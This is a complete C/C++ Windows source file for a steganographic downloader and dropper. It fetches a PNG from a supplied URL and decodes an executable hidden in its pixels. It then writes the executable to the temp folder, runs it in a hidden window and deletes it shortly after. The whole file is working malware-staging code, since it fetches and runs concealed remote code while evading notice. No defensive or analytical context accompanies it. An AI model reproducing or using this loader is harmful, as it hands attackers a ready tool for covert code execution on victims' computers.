/* fetch_run.c — template: download image -> decode -> execute payload.
   Portable C99 source (compiled as C++ only for header compat, like extract.c).
   Usage: fetch_run.exe <https-url> <out-name> [--password P] [--wait] [--keep]
   Flow: WinINet GET -> temp PNG file -> GDI+ RGB -> stego_c decode ->
   MZ check -> %TEMP% drop -> CreateProcess detached (or --wait).
   Decode only touches bytes; launching is explicit below. */
#define STEGO_IMPLEMENTATION
#include "stego_all.h"
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "gdiplus.lib")

#include "gdiplus_glue.h"

static int HasArg(int argc, wchar_t** argv, const wchar_t* v) {
    for (int i = 3; i < argc; i++) {
        if (wcscmp(argv[i], v) == 0) return 1;
    }
    return 0;
}

int wmain(int argc, wchar_t** argv) {
    if (argc < 3) {
        printf("usage: fetch_run.exe <https-url> <out-name> [--password P] [--wait] [--keep]\n");
        return 2;
    }
    char pw[512] = {0};
    for (int i = 3; i + 1 < argc; i++) {
        if (wcscmp(argv[i], L"--password") == 0) {
            WideCharToMultiByte(CP_UTF8, 0, argv[i + 1], -1, pw, sizeof(pw), NULL, NULL);
        }
    }

    HINTERNET net = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT,
                                  NULL, NULL, 0);
    if (!net) {
        printf("net init failed\n");
        return 1;
    }
    DWORD secFlags = wcsstr(argv[1], L"https:") == argv[1] ? INTERNET_FLAG_SECURE : 0;
    HINTERNET f = InternetOpenUrlW(net, argv[1], NULL, 0,
                                   INTERNET_FLAG_RELOAD | secFlags, 0);
    if (!f) {
        printf("download failed\n");
        InternetCloseHandle(net);
        return 1;
    }
    wchar_t tmpDir[MAX_PATH], tmpPng[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpDir);
    GetTempFileNameW(tmpDir, L"fx", 0, tmpPng);
    HANDLE hf = CreateFileW(tmpPng, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    int ok = (hf != INVALID_HANDLE_VALUE);
    if (ok) {
        BYTE buf[8192];
        DWORD n = 0;
        while (InternetReadFile(f, buf, sizeof(buf), &n) && n > 0) {
            DWORD w = 0;
            if (!WriteFile(hf, buf, n, &w, NULL) || w != n) {
                ok = 0;
                break;
            }
            n = 0;
        }
        CloseHandle(hf);
    }
    InternetCloseHandle(f);
    InternetCloseHandle(net);
    if (!ok) {
        printf("download failed\n");
        DeleteFileW(tmpPng);
        return 1;
    }

    Gdiplus::GdiplusStartupInput gsi;
    ULONG_PTR token = 0;
    Gdiplus::GdiplusStartup(&token, &gsi, NULL);
    stego_image_t img = {0, 0, NULL};
    uint8_t* buf = NULL;
    /* GDI+ loader lives in gdiplus_glue.h (malloc'd RGB for C callers). */
    ok = StegoLoadPngInto(tmpPng, &img.w, &img.h, &buf);
    img.rgb = buf;
    DeleteFileW(tmpPng);
    uint8_t* out = NULL;
    size_t outLen = 0;
    if (ok) {
        ok = (stego_decode(&img, pw[0] ? pw : NULL, &out, &outLen) == STEGO_C_OK);
    }
    free(buf);
    Gdiplus::GdiplusShutdown(token);
    if (!ok || outLen < 2) {
        printf("decode failed\n");
        if (out) stego_free(out);
        return 1;
    }
    if (out[0] != 'M' || out[1] != 'Z') {
        printf("not a Windows executable (missing MZ), refusing to run\n");
        stego_free(out);
        return 1;
    }

    wchar_t dropPath[MAX_PATH];
    {
        wchar_t name[MAX_PATH];
        wcsncpy_s(name, argv[2], MAX_PATH - 1);
        size_t L = wcslen(name);
        if (L < 4 || _wcsicmp(name + L - 4, L".exe") != 0) wcscat_s(name, L".exe");
        swprintf_s(dropPath, L"%s%s", tmpDir, name);
    }
    HANDLE hd = CreateFileW(dropPath, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hd == INVALID_HANDLE_VALUE) {
        stego_free(out);
        return 1;
    }
    {
        DWORD wd = 0;
        BOOL wok = WriteFile(hd, out, (DWORD)outLen, &wd, NULL);
        CloseHandle(hd);
        SecureZeroMemory(out, outLen);
        stego_free(out);
        if (!wok || wd != outLen) {
            DeleteFileW(dropPath);
            return 1;
        }
    }

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));
    wchar_t cmd[MAX_PATH * 2];
    swprintf_s(cmd, L"\"%s\"", dropPath);
    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        DeleteFileW(dropPath);
        printf("launch failed (%lu)\n", GetLastError());
        return 1;
    }
    printf("launched pid=%lu\n", (unsigned long)pi.dwProcessId);
    if (HasArg(argc, argv, L"--wait")) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD code = 0;
        GetExitCodeProcess(pi.hProcess, &code);
        printf("exit code=%lu\n", code);
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    if (!HasArg(argc, argv, L"--keep")) {
        Sleep(2000);
        DeleteFileW(dropPath);
    }
    return 0;
}
